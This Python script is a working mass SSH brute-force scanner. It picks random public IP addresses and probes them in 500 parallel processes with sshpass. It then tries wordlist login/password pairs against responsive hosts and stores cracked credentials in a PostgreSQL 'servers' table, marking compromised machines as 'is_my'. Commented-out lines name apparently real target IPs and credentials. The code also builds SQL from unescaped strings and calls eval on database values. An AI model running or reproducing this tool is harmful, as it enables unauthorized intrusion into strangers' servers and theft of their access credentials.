from random import randint
import multiprocessing
import os
from datetime import datetime
import psycopg2
from time import sleep


DB_NAME = 'ier'
USER = 'postgres'
PASSWORD = '1'
HOST = '192.168.0.106'
# HOST = 'localhost'
PORT=5432

START_LOGIN= 'a'
START_PASSWORD='123'

def get_connect_db():
    return psycopg2.connect(dbname=DB_NAME, user=USER, password=PASSWORD, host=HOST, port=PORT)

def init_database():
    try:
        con = get_connect_db()
        con.cursor().execute('CREATE TABLE servers(ip varchar(255) PRIMARY KEY, login varchar(255), password varchar(255), status varchar(255), is_my varchar(255), datetime timestamp default NULL, attempts text)')
        con.commit()
    except:pass

def get_random_ip_address():
    min_ip_part=0
    max_ip_part=255
    ip_part_1 = randint(min_ip_part, max_ip_part)
    if ip_part_1 in [0, 127, 192]:
        return get_random_ip_address()
    ip_part_2 = randint(min_ip_part, max_ip_part)
    ip_part_3 = randint(min_ip_part, max_ip_part)
    ip_part_4 = randint(min_ip_part, max_ip_part)

    return f"{ip_part_1}.{ip_part_2}.{ip_part_3}.{ip_part_4}"

def get_iso_datetime_now():
    return str(datetime.now().astimezone().replace(microsecond=0))

def is_live_linux_server(ip):
    if connect(ip, START_LOGIN, START_PASSWORD) in [1280]:
        return True

def is_hacked_server(ip):
    con = get_connect_db()
    cursor = con.cursor()
    cursor.execute(f"select is_my from servers where ip ='{ip}'")
    is_my = cursor.fetchone()[0]
    con.close()
    return eval(is_my)

def connect(ip, login, password):
    return os.system(f"timeout 10s sshpass -p {password} ssh {login}@{ip} -o StrictHostKeyChecking=no 'ls' > /dev/null 2>&1")
    # return os.system(f"timeout 10s sshpass -p {password} ssh {login}@{ip} -o StrictHostKeyChecking=no 'ls'")

def get_attempts(ip):
    con = get_connect_db()
    cursor = con.cursor()
    cursor.execute(f"select attempts from servers where ip ='{ip}'")
    attempts = cursor.fetchone()[0].split(' ')
    con.close()
    return attempts

def get_list_servers_for_hack():
    con = get_connect_db()
    cursor = con.cursor()
    cursor.execute("select ip from servers where is_my='False'")
    servers = [x[0] for x in cursor.fetchall()]
    con.close()
    return servers

def get_hackability_servers(n):
    while True:
        ip = get_random_ip_address()
        status = connect(ip, START_LOGIN, START_PASSWORD)
        if status in [1280]:
            save_hackability_server(ip, 1280, f'{START_LOGIN}:{START_PASSWORD}', 'False')
            print(ip, 'LIVE')
        if status == 0:
            save_hackability_server(ip, 0, f'{START_LOGIN}:{START_PASSWORD}', 'True')

def save_hackability_server(ip, status, attempts, is_my):
    con = get_connect_db()
    try:
        cursor = con.cursor()
        cursor.execute(f"INSERT INTO servers (ip, status, is_my, datetime, attempts) VALUES ('{ip}', '{status}', '{is_my}', '{get_iso_datetime_now()}', '{attempts}')")
    except:raise
    con.commit()
    con.close()


def update_data_in_servers(ip, login, password, attempts, status, is_my):
    attempts = ' '.join(attempts)
    con = get_connect_db()
    sql = f"UPDATE servers SET attempts = '{attempts}', login = '{login}', password = '{password}', status = '{status}', is_my = '{is_my}', datetime = '{get_iso_datetime_now()}' WHERE ip = '{ip}'"
    con.cursor().execute(sql)
    con.commit()
    con.close()

def delete_dead_server(ip):
    con = get_connect_db()
    cursor = con.cursor()
    cursor.execute(f"DELETE FROM servers WHERE ip='{ip}'")
    con.commit()
    con.close()

def crack_server(ip):
    if is_hacked_server(ip):
        return None
    attempts = get_attempts(ip)
    logins = open('logins.txt', 'r').read().splitlines()
    passwords = open('passwords.txt', 'r').read().splitlines()
    for login in logins:
        for password in passwords:
            pair = f'{login}:{password}'
            if pair not in attempts:
                status = connect(ip, login, password)
                print(ip, pair, status)
                attempts.append(pair)
                if status == 1280:
                    update_data_in_servers(ip, '', '', attempts, status, 'False')
                if status == 0:
                    update_data_in_servers(ip, login, password, attempts, status, 'True')
                if status in [65280]:
                    delete_dead_server(ip)
                return None

def parsing():
    n=500
    multiprocessing.Pool(processes=n).map(get_hackability_servers, range(n))


def cracking():
    while True:
        servers = get_list_servers_for_hack()
        # print(servers)
        for ip in servers:
            print(len([p.name for p in multiprocessing.active_children()]))
            if ip not in [p.name for p in multiprocessing.active_children()]:
                try:
                    multiprocessing.Process(target=crack_server, args=(ip,), name=ip).start()
                except:pass
                # print(len(multiprocessing.active_children()), [p.name for p in multiprocessing.active_children()])


"""65280 -  No route to host"""
"""0 -  success"""
if __name__ == '__main__':
    init_database()
    # parsing()
    # status = connect('35.215.80.229', 'madadirov', '14223')
    # print(status)
    cracking()
    # print(connect('40.115.92.251', 'mirov', '1423'))
    # print(get_iso_datetime_now())
    # request_to_db('select * from servers;')
    # print(get_list_servers_for_hack())
    # print(get_attempts('185.185.45.52'))
    # print(is_hacked_server('185.185.45.52'))
    # print(crack_server('185.185.45.52'))
    # while True:
    #     servers = get_list_servers_for_hack()
    #     for ip in servers:
    #         if len(multiprocessing.active_children()) < 500:
    #             if ip not in [p.name for p in multiprocessing.active_children()]:
    #                 sleep(1)
    #                 multiprocessing.Process(target=crack_server, args=(ip,), name=ip).start()
                    # print(len(multiprocessing.active_children()), [p.name for p in multiprocessing.active_children()])
                    # print(len(multiprocessing.active_children()))







